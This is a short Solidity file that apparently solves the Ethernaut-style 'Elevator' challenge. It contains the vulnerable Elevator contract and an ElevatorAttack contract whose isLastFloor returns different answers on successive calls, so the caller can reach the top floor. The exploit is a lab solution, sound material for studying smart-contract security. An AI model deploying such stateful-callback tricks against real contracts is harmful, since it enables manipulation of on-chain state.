// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract ElevatorAttack is Building {
    uint count;
    address elevator;

    constructor(address _elevator) {
        elevator = _elevator;
    }

    function callGoTo() public {
        Elevator(elevator).goTo(1);
    }

    function isLastFloor(uint _floor) public returns (bool) {
        if (count == 0) {
            count++;
            return false;
        } else {
            return true;
        }
    }
}
